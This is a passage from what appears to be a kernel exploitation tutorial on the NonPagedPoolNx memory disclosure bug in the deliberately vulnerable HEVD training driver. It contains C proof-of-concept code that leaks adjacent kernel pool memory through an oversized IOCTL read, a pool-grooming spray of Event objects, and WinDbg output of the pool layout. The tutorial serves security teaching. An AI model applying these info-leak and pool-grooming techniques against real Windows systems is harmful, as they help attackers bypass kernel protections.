<a id="__codelineno-4-45" name="__codelineno-4-45"></a><span class="w">    </span><span class="p">}</span><span class="w"></span>
<a id="__codelineno-4-46" name="__codelineno-4-46"></a>
<a id="__codelineno-4-47" name="__codelineno-4-47"></a><span class="p">}</span><span class="w"></span>
<a id="__codelineno-4-48" name="__codelineno-4-48"></a>
<a id="__codelineno-4-49" name="__codelineno-4-49"></a><span class="kt">int</span><span class="w"> </span><span class="nf">main</span><span class="p">()</span><span class="w"></span>
<a id="__codelineno-4-50" name="__codelineno-4-50"></a><span class="p">{</span><span class="w"></span>
<a id="__codelineno-4-51" name="__codelineno-4-51"></a><span class="w">    </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;[+] HEVD: NonPagedPoolNx Memory Disclosure!</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span><span class="w"></span>
<a id="__codelineno-4-52" name="__codelineno-4-52"></a>
<a id="__codelineno-4-53" name="__codelineno-4-53"></a><span class="w">    </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;[*] Opening handle to the driver!</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span><span class="w"></span>
<a id="__codelineno-4-54" name="__codelineno-4-54"></a><span class="w">    </span><span class="n">HANDLE</span><span class="w"> </span><span class="n">DriverHandle</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">OpenDriverHandle</span><span class="p">();</span><span class="w"></span>
<a id="__codelineno-4-55" name="__codelineno-4-55"></a>
<a id="__codelineno-4-56" name="__codelineno-4-56"></a><span class="w">    </span><span class="n">exploit</span><span class="p">(</span><span class="n">DriverHandle</span><span class="p">);</span><span class="w"></span>
<a id="__codelineno-4-57" name="__codelineno-4-57"></a><span class="p">}</span><span class="w"></span>
</code></pre></div></td></tr></table></div>
<ol>
<li>Notice how we use <code>lpOutBuffer</code> and <code>nOutBufferSize</code> here since we're doing a <code>read()</code> rather than a <code>write()</code>.</li>
</ol>
<p>The important thing to take note of here is the call to <code>DeviceIoControl</code> before moving onwards with our analysis let's quickly take a look at the <a href="https://docs.microsoft.com/en-us/windows/win32/api/ioapiset/nf-ioapiset-deviceiocontrol">prototype from MSDN</a>.</p>
<div class="highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">DeviceIoControl Prototype</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-5-1"> 1</a></span>
<span class="normal"><a href="#__codelineno-5-2"> 2</a></span>
<span class="normal"><a href="#__codelineno-5-3"> 3</a></span>
<span class="normal"><a href="#__codelineno-5-4"> 4</a></span>
<span class="normal"><a href="#__codelineno-5-5"> 5</a></span>
<span class="normal"><a href="#__codelineno-5-6"> 6</a></span>
<span class="normal"><a href="#__codelineno-5-7"> 7</a></span>
<span class="normal"><a href="#__codelineno-5-8"> 8</a></span>
<span class="normal"><a href="#__codelineno-5-9"> 9</a></span>
<span class="normal"><a href="#__codelineno-5-10">10</a></span></pre></div></td><td class="code"><div><pre><span></span><code><a id="__codelineno-5-1" name="__codelineno-5-1"></a><span class="n">BOOL</span><span class="w"> </span><span class="nf">DeviceIoControl</span><span class="p">(</span><span class="w"></span>
<a id="__codelineno-5-2" name="__codelineno-5-2"></a><span class="w">  </span><span class="p">[</span><span class="n">in</span><span class="p">]</span><span class="w">                </span><span class="n">HANDLE</span><span class="w">       </span><span class="n">hDevice</span><span class="p">,</span><span class="w"></span>
<a id="__codelineno-5-3" name="__codelineno-5-3"></a><span class="w">  </span><span class="p">[</span><span class="n">in</span><span class="p">]</span><span class="w">                </span><span class="n">DWORD</span><span class="w">        </span><span class="n">dwIoControlCode</span><span class="p">,</span><span class="w"></span>
<a id="__codelineno-5-4" name="__codelineno-5-4"></a><span class="w">  </span><span class="p">[</span><span class="n">in</span><span class="p">,</span><span class="w"> </span><span class="n">optional</span><span class="p">]</span><span class="w">      </span><span class="n">LPVOID</span><span class="w">       </span><span class="n">lpInBuffer</span><span class="p">,</span><span class="w"></span>
<a id="__codelineno-5-5" name="__codelineno-5-5"></a><span class="w">  </span><span class="p">[</span><span class="n">in</span><span class="p">]</span><span class="w">                </span><span class="n">DWORD</span><span class="w">        </span><span class="n">nInBufferSize</span><span class="p">,</span><span class="w"></span>
<a id="__codelineno-5-6" name="__codelineno-5-6"></a><span class="w">  </span><span class="p">[</span><span class="n">out</span><span class="p">,</span><span class="w"> </span><span class="n">optional</span><span class="p">]</span><span class="w">     </span><span class="n">LPVOID</span><span class="w">       </span><span class="n">lpOutBuffer</span><span class="p">,</span><span class="w"></span>
<a id="__codelineno-5-7" name="__codelineno-5-7"></a><span class="w">  </span><span class="p">[</span><span class="n">in</span><span class="p">]</span><span class="w">                </span><span class="n">DWORD</span><span class="w">        </span><span class="n">nOutBufferSize</span><span class="p">,</span><span class="w"></span>
<a id="__codelineno-5-8" name="__codelineno-5-8"></a><span class="w">  </span><span class="p">[</span><span class="n">out</span><span class="p">,</span><span class="w"> </span><span class="n">optional</span><span class="p">]</span><span class="w">     </span><span class="n">LPDWORD</span><span class="w">      </span><span class="n">lpBytesReturned</span><span class="p">,</span><span class="w"></span>
<a id="__codelineno-5-9" name="__codelineno-5-9"></a><span class="w">  </span><span class="p">[</span><span class="n">in</span><span class="p">,</span><span class="w"> </span><span class="n">out</span><span class="p">,</span><span class="w"> </span><span class="n">optional</span><span class="p">]</span><span class="w"> </span><span class="n">LPOVERLAPPED</span><span class="w"> </span><span class="n">lpOverlapped</span><span class="w"></span>
<a id="__codelineno-5-10" name="__codelineno-5-10"></a><span class="p">);</span><span class="w"></span>
</code></pre></div></td></tr></table></div>
<p>In previous posts we've heavily used the <code>lpInBuffer</code> and <code>nInBufferSize</code> arguments whereas for this exploit we're actually going to need to use the <code>lpOutBuffer</code> and <code>nOutBufferSize</code> arguments, which you can see in our above simple program. If we compile and run the code we should see some output like shown below.</p>
<div class="highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">Basic POC</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-6-1">1</a></span>
<span class="normal"><a href="#__codelineno-6-2">2</a></span>
<span class="normal"><a href="#__codelineno-6-3">3</a></span>
<span class="normal"><a href="#__codelineno-6-4">4</a></span>
<span class="normal"><a href="#__codelineno-6-5">5</a></span>
<span class="normal"><a href="#__codelineno-6-6">6</a></span></pre></div></td><td class="code"><div><pre><span></span><code><a id="__codelineno-6-1" name="__codelineno-6-1"></a>C:\Users\admin\Desktop&gt;NonPagedPoolNxMemoryDisclosure.exe
<a id="__codelineno-6-2" name="__codelineno-6-2"></a>[+] HEVD: NonPagedPoolNx Memory Disclosure!
<a id="__codelineno-6-3" name="__codelineno-6-3"></a>[*] Opening handle to the driver!
<a id="__codelineno-6-4" name="__codelineno-6-4"></a>        [+] Opened Driver Handle: 0x7c
<a id="__codelineno-6-5" name="__codelineno-6-5"></a>[*] Sending IOCTL to driver!
<a id="__codelineno-6-6" name="__codelineno-6-6"></a>[+] Kernel Allocation Contents: 4141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141410
</code></pre></div></td></tr></table></div>
<p>As you can clearly see, we are able to read data from the allocated kernel buffer since we're receiving the <code>A</code> characters which we know are the result of a <code>memset()</code> the function does.</p>
<h1 id="exploitation">Exploitation<a class="headerlink" href="#exploitation" title="Permanent link">&para;</a></h1>
<p>Exploitation of this vulnerability is fairly simple, we can make a request for more data than the allocated pool chunk of 0x1F8 has. Let's make a minor modification to our exploit code and request 0x1F8 * 2 which is 0x3F0. You can find the changes to the POC below.</p>
<div class="highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">Exploit Attempt</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-7-1"> 1</a></span>
<span class="normal"><a href="#__codelineno-7-2"> 2</a></span>
<span class="normal"><a href="#__codelineno-7-3"> 3</a></span>
<span class="normal"><a href="#__codelineno-7-4"> 4</a></span>
<span class="normal"><a href="#__codelineno-7-5"> 5</a></span>
<span class="normal"><a href="#__codelineno-7-6"> 6</a></span>
<span class="normal"><a href="#__codelineno-7-7"> 7</a></span>
<span class="normal"><a href="#__codelineno-7-8"> 8</a></span>
<span class="normal"><a href="#__codelineno-7-9"> 9</a></span>
<span class="normal"><a href="#__codelineno-7-10">10</a></span>
<span class="normal"><a href="#__codelineno-7-11">11</a></span>
<span class="normal"><a href="#__codelineno-7-12">12</a></span>
<span class="normal"><a href="#__codelineno-7-13">13</a></span>
<span class="normal"><a href="#__codelineno-7-14">14</a></span>
<span class="normal"><a href="#__codelineno-7-15">15</a></span>
<span class="normal"><a href="#__codelineno-7-16">16</a></span>
<span class="normal"><a href="#__codelineno-7-17">17</a></span>
<span class="normal"><a href="#__codelineno-7-18">18</a></span>
<span class="normal"><a href="#__codelineno-7-19">19</a></span>
<span class="normal"><a href="#__codelineno-7-20">20</a></span>
<span class="normal"><a href="#__codelineno-7-21">21</a></span></pre></div></td><td class="code"><div><pre><span></span><code><a id="__codelineno-7-1" name="__codelineno-7-1"></a><span class="kt">void</span><span class="w"> </span><span class="nf">exploit</span><span class="p">(</span><span class="n">HANDLE</span><span class="w"> </span><span class="n">DriverHandle</span><span class="p">)</span><span class="w"></span>
<a id="__codelineno-7-2" name="__codelineno-7-2"></a><span class="p">{</span><span class="w"></span>
<a id="__codelineno-7-3" name="__codelineno-7-3"></a>
<a id="__codelineno-7-4" name="__codelineno-7-4"></a><span class="w">    </span><span class="n">DWORD</span><span class="w">   </span><span class="n">BytesReturned</span><span class="p">;</span><span class="w"></span>
<a id="__codelineno-7-5" name="__codelineno-7-5"></a><span class="w">    </span><span class="n">BYTE</span><span class="w">    </span><span class="n">OutputBuffer</span><span class="p">[</span><span class="mh">0x3F0</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">{</span><span class="mi">0</span><span class="p">};</span><span class="w"></span>
<a id="__codelineno-7-6" name="__codelineno-7-6"></a>
<a id="__codelineno-7-7" name="__codelineno-7-7"></a><span class="w">    </span><span class="cm">/* Issue IOCTL */</span><span class="w"></span>
<a id="__codelineno-7-8" name="__codelineno-7-8"></a><span class="w">    </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;[*] Sending IOCTL to driver!</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span><span class="w"></span>
<a id="__codelineno-7-9" name="__codelineno-7-9"></a><span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="o">!</span><span class="n">DeviceIoControl</span><span class="p">(</span><span class="n">DriverHandle</span><span class="p">,</span><span class="w"> </span><span class="n">IOCTL_CODE</span><span class="p">,</span><span class="w"> </span><span class="nb">NULL</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="o">&amp;</span><span class="n">OutputBuffer</span><span class="p">,</span><span class="w"> </span><span class="mh">0x3F0</span><span class="p">,</span><span class="w"> </span><span class="o">&amp;</span><span class="n">BytesReturned</span><span class="p">,</span><span class="w"> </span><span class="nb">NULL</span><span class="p">))</span><span class="w"></span>
<a id="__codelineno-7-10" name="__codelineno-7-10"></a><span class="w">    </span><span class="p">{</span><span class="w"></span>
<a id="__codelineno-7-11" name="__codelineno-7-11"></a><span class="w">        </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;[!] FATAL: Error sending IOCTL to driver!</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span><span class="w"></span>
<a id="__codelineno-7-12" name="__codelineno-7-12"></a><span class="w">        </span><span class="k">return</span><span class="p">;</span><span class="w"></span>
<a id="__codelineno-7-13" name="__codelineno-7-13"></a><span class="w">    </span><span class="p">}</span><span class="w"></span>
<a id="__codelineno-7-14" name="__codelineno-7-14"></a>
<a id="__codelineno-7-15" name="__codelineno-7-15"></a><span class="w">    </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;[+] Kernel Allocation Contents: &quot;</span><span class="p">);</span><span class="w"></span>
<a id="__codelineno-7-16" name="__codelineno-7-16"></a><span class="w">    </span><span class="k">for</span><span class="w"> </span><span class="p">(</span><span class="kt">int</span><span class="w"> </span><span class="n">i</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span><span class="w"> </span><span class="n">i</span><span class="w"> </span><span class="o">&lt;=</span><span class="w"> </span><span class="mh">0x3F0</span><span class="p">;</span><span class="w"> </span><span class="n">i</span><span class="o">++</span><span class="p">)</span><span class="w"></span>
<a id="__codelineno-7-17" name="__codelineno-7-17"></a><span class="w">    </span><span class="p">{</span><span class="w"></span>
<a id="__codelineno-7-18" name="__codelineno-7-18"></a><span class="w">        </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;%x&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">OutputBuffer</span><span class="p">[</span><span class="n">i</span><span class="p">]);</span><span class="w"></span>
<a id="__codelineno-7-19" name="__codelineno-7-19"></a><span class="w">    </span><span class="p">}</span><span class="w"></span>
<a id="__codelineno-7-20" name="__codelineno-7-20"></a>
<a id="__codelineno-7-21" name="__codelineno-7-21"></a><span class="p">}</span><span class="w"></span>
</code></pre></div></td></tr></table></div>
<details class="hint" open="open">
<summary>Hint</summary>
<p>The <code>A</code> characters have been removed from the output below for brevity.</p>
</details>
<div class="highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">Leaking Data :smile:</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-8-1">1</a></span>
<span class="normal"><a href="#__codelineno-8-2">2</a></span>
<span class="normal"><a href="#__codelineno-8-3">3</a></span>
<span class="normal"><a href="#__codelineno-8-4">4</a></span>
<span class="normal"><a href="#__codelineno-8-5">5</a></span>
<span class="normal"><a href="#__codelineno-8-6">6</a></span></pre></div></td><td class="code"><div><pre><span></span><code><a id="__codelineno-8-1" name="__codelineno-8-1"></a>C:\Users\admin\Desktop&gt;NonPagedPoolNxMemoryDisclosure.exe
<a id="__codelineno-8-2" name="__codelineno-8-2"></a>[+] HEVD: NonPagedPoolNx Memory Disclosure!
<a id="__codelineno-8-3" name="__codelineno-8-3"></a>[*] Opening handle to the driver!
<a id="__codelineno-8-4" name="__codelineno-8-4"></a>        [+] Opened Driver Handle: 0x7c
<a id="__codelineno-8-5" name="__codelineno-8-5"></a>[*] Sending IOCTL to driver!
<a id="__codelineno-8-6" name="__codelineno-8-6"></a>[+] Kernel Allocation Contents: 0000000021019246696c6572bc4a5ecf769d45889afeae689ffff4899feae689ffff04008010000000000000000006099feae689ffff000000000000689ffff10000000000000000000000006f04c401100405c47853f8ffff0000000050d80000070ec4dac689ffffe0b64dac689ffff904617ba8daefffff04817ba8daeffffc8e0f8ae689ffff0000000000000000000000000010010042404000005207800000a0bbc6b98daeffff00000000000000000000000010600000389afeae689ffff389afeae689ffff00600000509afeae689ffff509afeae689ffff0000000000000000709afeae689ffff709afeae689ffff000000000000000000000000000000001000000000000000000000000000000019019246696c6582bf4a5ecf769d45189cfeae689fffff08d50ac689ffffd8000801000000000000000000000000000000000000000000210000000000000000
</code></pre></div></td></tr></table></div>
<p>As you can see in the above output, it is pretty clear that we are able to leak arbitrary data from adjacent pool chunks. The next step though is how we turn this data into something useful.</p>
<h2 id="leaking-driver-addresses">Leaking Driver Addresses<a class="headerlink" href="#leaking-driver-addresses" title="Permanent link">&para;</a></h2>
<p>Our current POC is simply leaking data from the adjacent pool chunks, while this could certainly be useful there is more we can do with this. For starters, it would be nice to leak the base address of the driver. We should be able to do this very easily.</p>
<p>In order to leak addresses we actually want such as the base address of <abbr title="HackSys Extreme Vulnerable Driver">HEVD</abbr> for example, we're going to need to carry out the process of "pool grooming". All this term really means is; <em>getting the pool into a state which is desirable to us, the attacker.</em> Pool grooming is a very well understood concept and there's a number of ways we can approach it. The most common way to perform grooming of the pool is to do lots of allocations of Kernel Objects such as the Event Object for example. With that in mind, let's go ahead and create a new function in our POC to spray some Kernel Objects.</p>
<div class="highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">Pool Spray Function</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-9-1"> 1</a></span>
<span class="normal"><a href="#__codelineno-9-2"> 2</a></span>
<span class="normal"><a href="#__codelineno-9-3"> 3</a></span>
<span class="normal"><a href="#__codelineno-9-4"> 4</a></span>
<span class="normal"><a href="#__codelineno-9-5"> 5</a></span>
<span class="normal"><a href="#__codelineno-9-6"> 6</a></span>
<span class="normal"><a href="#__codelineno-9-7"> 7</a></span>
<span class="normal"><a href="#__codelineno-9-8"> 8</a></span>
<span class="normal"><a href="#__codelineno-9-9"> 9</a></span>
<span class="normal"><a href="#__codelineno-9-10">10</a></span>
<span class="normal"><a href="#__codelineno-9-11">11</a></span></pre></div></td><td class="code"><div><pre><span></span><code><a id="__codelineno-9-1" name="__codelineno-9-1"></a><span class="kt">void</span><span class="w"> </span><span class="nf">PoolSpray</span><span class="p">()</span><span class="w"></span>
<a id="__codelineno-9-2" name="__codelineno-9-2"></a><span class="p">{</span><span class="w"></span>
<a id="__codelineno-9-3" name="__codelineno-9-3"></a><span class="w">    </span><span class="n">HANDLE</span><span class="w">  </span><span class="n">EventObjects</span><span class="p">[</span><span class="mi">10000</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">{</span><span class="mi">0</span><span class="p">};</span><span class="w"></span>
<a id="__codelineno-9-4" name="__codelineno-9-4"></a>
<a id="__codelineno-9-5" name="__codelineno-9-5"></a><span class="w">    </span><span class="k">for</span><span class="w"> </span><span class="p">(</span><span class="kt">int</span><span class="w"> </span><span class="n">i</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span><span class="w"> </span><span class="n">i</span><span class="w"> </span><span class="o">&lt;=</span><span class="w"> </span><span class="mi">10000</span><span class="p">;</span><span class="w"> </span><span class="n">i</span><span class="o">++</span><span class="p">)</span><span class="w"></span>
<a id="__codelineno-9-6" name="__codelineno-9-6"></a><span class="w">    </span><span class="p">{</span><span class="w"></span>
<a id="__codelineno-9-7" name="__codelineno-9-7"></a><span class="w">        </span><span class="n">HANDLE</span><span class="w"> </span><span class="n">EventHandle</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">CreateEventA</span><span class="p">(</span><span class="nb">NULL</span><span class="p">,</span><span class="w"> </span><span class="n">FALSE</span><span class="p">,</span><span class="w"> </span><span class="n">FALSE</span><span class="p">,</span><span class="w"> </span><span class="nb">NULL</span><span class="p">);</span><span class="w"></span>
<a id="__codelineno-9-8" name="__codelineno-9-8"></a>
<a id="__codelineno-9-9" name="__codelineno-9-9"></a><span class="w">        </span><span class="n">EventObjects</span><span class="p">[</span><span class="n">i</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">EventHandle</span><span class="p">;</span><span class="w"></span>
<a id="__codelineno-9-10" name="__codelineno-9-10"></a><span class="w">    </span><span class="p">}</span><span class="w"></span>
<a id="__codelineno-9-11" name="__codelineno-9-11"></a><span class="p">}</span><span class="w"></span>
</code></pre></div></td></tr></table></div>
<p>The above function is a very simple pool spray which we can use to fulfil our goal of grooming the pool. We create an array called <code>EventObjects</code> which can store 10,000 event object handles. Then inside a for loop we create 10,000 event objects. Finally we make sure to pass those returned handles to our array so that we can use them later.</p>
<h3 id="inspecting-the-pool">Inspecting the Pool<a class="headerlink" href="#inspecting-the-pool" title="Permanent link">&para;</a></h3>
<p>With the new function we just created, let's set a breakpoint after the pool allocation and inspect the state of the pool.</p>
<div class="highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-10-1"> 1</a></span>
<span class="normal"><a href="#__codelineno-10-2"> 2</a></span>
<span class="normal"><a href="#__codelineno-10-3"> 3</a></span>
<span class="normal"><a href="#__codelineno-10-4"> 4</a></span>
<span class="normal"><a href="#__codelineno-10-5"> 5</a></span>
<span class="normal"><a href="#__codelineno-10-6"> 6</a></span>
<span class="normal"><a href="#__codelineno-10-7"> 7</a></span>
<span class="normal"><a href="#__codelineno-10-8"> 8</a></span>
<span class="normal"><a href="#__codelineno-10-9"> 9</a></span>
<span class="normal"><a href="#__codelineno-10-10">10</a></span>
<span class="normal"><a href="#__codelineno-10-11">11</a></span>
<span class="normal"><a href="#__codelineno-10-12">12</a></span>
<span class="normal"><a href="#__codelineno-10-13">13</a></span>
<span class="normal"><a href="#__codelineno-10-14">14</a></span>
<span class="normal"><a href="#__codelineno-10-15">15</a></span>
<span class="normal"><a href="#__codelineno-10-16">16</a></span>
<span class="normal"><a href="#__codelineno-10-17">17</a></span>
<span class="normal"><a href="#__codelineno-10-18">18</a></span></pre></div></td><td class="code"><div><pre><span></span><code><a id="__codelineno-10-1" name="__codelineno-10-1"></a>0: kd&gt; bp HEVD!TriggerMemoryDisclosureNonPagedPoolNx+59
<a id="__codelineno-10-2" name="__codelineno-10-2"></a>0: kd&gt; g
<a id="__codelineno-10-3" name="__codelineno-10-3"></a>
<a id="__codelineno-10-4" name="__codelineno-10-4"></a>Breakpoint 1 hit
<a id="__codelineno-10-5" name="__codelineno-10-5"></a>HEVD!TriggerMemoryDisclosureNonPagedPoolNx+0x59:
<a id="__codelineno-10-6" name="__codelineno-10-6"></a>fffff800`4a8c6f5d 488bf8          mov     rdi,rax
<a id="__codelineno-10-7" name="__codelineno-10-7"></a>
<a id="__codelineno-10-8" name="__codelineno-10-8"></a>0: kd&gt; r
<a id="__codelineno-10-9" name="__codelineno-10-9"></a>rax=ffff8700c6f662c0 rbx=0000000000000000 rcx=0000000000000010
<a id="__codelineno-10-10" name="__codelineno-10-10"></a>rdx=0000000000000bd7 rsi=00000086857ff260 rdi=000000000000004d
<a id="__codelineno-10-11" name="__codelineno-10-11"></a>rip=fffff8004a8c6f5d rsp=fffff90f1ae82760 rbp=ffff8700c61d27f0
<a id="__codelineno-10-12" name="__codelineno-10-12"></a> r8=ffff8700c3600000  r9=0000000000000000 r10=000000006b636148
<a id="__codelineno-10-13" name="__codelineno-10-13"></a>r11=0000000000001001 r12=000000000000004d r13=00000000000001f8
<a id="__codelineno-10-14" name="__codelineno-10-14"></a>r14=00000000000003f0 r15=0000000000000003
<a id="__codelineno-10-15" name="__codelineno-10-15"></a>iopl=0         nv up ei ng nz na pe nc
<a id="__codelineno-10-16" name="__codelineno-10-16"></a>cs=0010  ss=0018  ds=002b  es=002b  fs=0053  gs=002b             efl=00000282
<a id="__codelineno-10-17" name="__codelineno-10-17"></a>HEVD!TriggerMemoryDisclosureNonPagedPoolNx+0x59:
<a id="__codelineno-10-18" name="__codelineno-10-18"></a>fffff800`4a8c6f5d 488bf8          mov     rdi,rax
</code></pre></div></td></tr></table></div>
<p>What we should see is that our sprayed objects are filling the pool. We can use the <code>!poolused</code> command in order to find the number of allocations of specific events in this case we're interested in Events which can be found via their <code>POOL_TAG</code> of <code>Even</code>.</p>
<div class="highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-11-1">1</a></span>
<span class="normal"><a href="#__codelineno-11-2">2</a></span>
<span class="normal"><a href="#__codelineno-11-3">3</a></span>
<span class="normal"><a href="#__codelineno-11-4">4</a></span>
<span class="normal"><a href="#__codelineno-11-5">5</a></span>
<span class="normal"><a href="#__codelineno-11-6">6</a></span>
<span class="normal"><a href="#__codelineno-11-7">7</a></span>
<span class="normal"><a href="#__codelineno-11-8">8</a></span></pre></div></td><td class="code"><div><pre><span></span><code><a id="__codelineno-11-1" name="__codelineno-11-1"></a>0: kd&gt; !poolused 2 Even
<a id="__codelineno-11-2" name="__codelineno-11-2"></a>
<a id="__codelineno-11-3" name="__codelineno-11-3"></a>               NonPaged                  Paged
<a id="__codelineno-11-4" name="__codelineno-11-4"></a> Tag     Allocs         Used     Allocs         Used
<a id="__codelineno-11-5" name="__codelineno-11-5"></a>
<a id="__codelineno-11-6" name="__codelineno-11-6"></a> Even     19248      2470752          0            0    Event objects 
<a id="__codelineno-11-7" name="__codelineno-11-7"></a>
<a id="__codelineno-11-8" name="__codelineno-11-8"></a>TOTAL     19248      2470752          0            0
</code></pre></div></td></tr></table></div>
<p>As you can see in the above, we've successfully managed to allocate some objects in the NonPaged Pool of our choosing. The address of the pool allocation is returned in <code>RAX</code> and we can use the <code>!pool</code> command to inspect that pool page.</p>
<div class="highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-12-1"> 1</a></span>
<span class="normal"><a href="#__codelineno-12-2"> 2</a></span>
<span class="normal"><a href="#__codelineno-12-3"> 3</a></span>
<span class="normal"><a href="#__codelineno-12-4"> 4</a></span>
<span class="normal"><a href="#__codelineno-12-5"> 5</a></span>
<span class="normal"><a href="#__codelineno-12-6"> 6</a></span>
<span class="normal"><a href="#__codelineno-12-7"> 7</a></span>
<span class="normal"><a href="#__codelineno-12-8"> 8</a></span>
<span class="normal"><a href="#__codelineno-12-9"> 9</a></span>
<span class="normal"><a href="#__codelineno-12-10">10</a></span>
<span class="normal"><a href="#__codelineno-12-11">11</a></span>
<span class="normal"><a href="#__codelineno-12-12">12</a></span>
<span class="normal"><a href="#__codelineno-12-13">13</a></span>
<span class="normal"><a href="#__codelineno-12-14">14</a></span>
<span class="normal"><a href="#__codelineno-12-15">15</a></span>
<span class="normal"><a href="#__codelineno-12-16">16</a></span>
<span class="normal"><a href="#__codelineno-12-17">17</a></span>
<span class="normal"><a href="#__codelineno-12-18">18</a></span>
<span class="normal"><a href="#__codelineno-12-19">19</a></span>
<span class="normal"><a href="#__codelineno-12-20">20</a></span>
<span class="normal"><a href="#__codelineno-12-21">21</a></span>
<span class="normal"><a href="#__codelineno-12-22">22</a></span>
<span class="normal"><a href="#__codelineno-12-23">23</a></span>
<span class="normal"><a href="#__codelineno-12-24">24</a></span>
<span class="normal"><a href="#__codelineno-12-25">25</a></span>
<span class="normal"><a href="#__codelineno-12-26">26</a></span></pre></div></td><td class="code"><div><pre><span></span><code><a id="__codelineno-12-1" name="__codelineno-12-1"></a>0: kd&gt; !pool ffff8700c6f662c0
<a id="__codelineno-12-2" name="__codelineno-12-2"></a>Pool page ffff8700c6f662c0 region is Nonpaged pool
<a id="__codelineno-12-3" name="__codelineno-12-3"></a> ffff8700c6f66000 size:   80 previous size:    0  (Allocated)  Even
<a id="__codelineno-12-4" name="__codelineno-12-4"></a> ffff8700c6f66080 size:  230 previous size:   80  (Free)       Free
<a id="__codelineno-12-5" name="__codelineno-12-5"></a>*ffff8700c6f662b0 size:  210 previous size:  230  (Allocated) *Hack
<a id="__codelineno-12-6" name="__codelineno-12-6"></a>        Owning component : Unknown (update pooltag.txt)
<a id="__codelineno-12-7" name="__codelineno-12-7"></a> ffff8700c6f664c0 size:   80 previous size:  210  (Free )  Io  
<a id="__codelineno-12-8" name="__codelineno-12-8"></a> ffff8700c6f66540 size:   80 previous size:   80  (Allocated)  Even
<a id="__codelineno-12-9" name="__codelineno-12-9"></a> ffff8700c6f665e0 size:   80 previous size:   80  (Allocated)  Even
<a id="__codelineno-12-10" name="__codelineno-12-10"></a> ffff8700c6f66660 size:   80 previous size:   80  (Allocated)  Even
<a id="__codelineno-12-11" name="__codelineno-12-11"></a> ffff8700c6f66700 size:   80 previous size:   80  (Allocated)  Even
<a id="__codelineno-12-12" name="__codelineno-12-12"></a> ffff8700c6f66780 size:   80 previous size:   80  (Allocated)  Even
<a id="__codelineno-12-13" name="__codelineno-12-13"></a> ffff8700c6f66820 size:   80 previous size:   80  (Allocated)  Even
<a id="__codelineno-12-14" name="__codelineno-12-14"></a> ffff8700c6f668a0 size:   80 previous size:   80  (Allocated)  Even
<a id="__codelineno-12-15" name="__codelineno-12-15"></a> ffff8700c6f66940 size:   80 previous size:   80  (Allocated)  Even
<a id="__codelineno-12-16" name="__codelineno-12-16"></a> ffff8700c6f669c0 size:   80 previous size:   80  (Allocated)  Even
<a id="__codelineno-12-17" name="__codelineno-12-17"></a> ffff8700c6f66a60 size:   80 previous size:   80  (Allocated)  Even
<a id="__codelineno-12-18" name="__codelineno-12-18"></a> ffff8700c6f66ae0 size:   80 previous size:   80  (Allocated)  Even
<a id="__codelineno-12-19" name="__codelineno-12-19"></a> ffff8700c6f66b80 size:   80 previous size:   80  (Allocated)  Even
<a id="__codelineno-12-20" name="__codelineno-12-20"></a> ffff8700c6f66c00 size:   80 previous size:   80  (Allocated)  Even
<a id="__codelineno-12-21" name="__codelineno-12-21"></a> ffff8700c6f66ca0 size:   80 previous size:   80  (Allocated)  Even
<a id="__codelineno-12-22" name="__codelineno-12-22"></a> ffff8700c6f66d20 size:   80 previous size:   80  (Allocated)  Even
<a id="__codelineno-12-23" name="__codelineno-12-23"></a> ffff8700c6f66dc0 size:   80 previous size:   80  (Allocated)  Even
<a id="__codelineno-12-24" name="__codelineno-12-24"></a> ffff8700c6f66e40 size:   80 previous size:   80  (Allocated)  Even
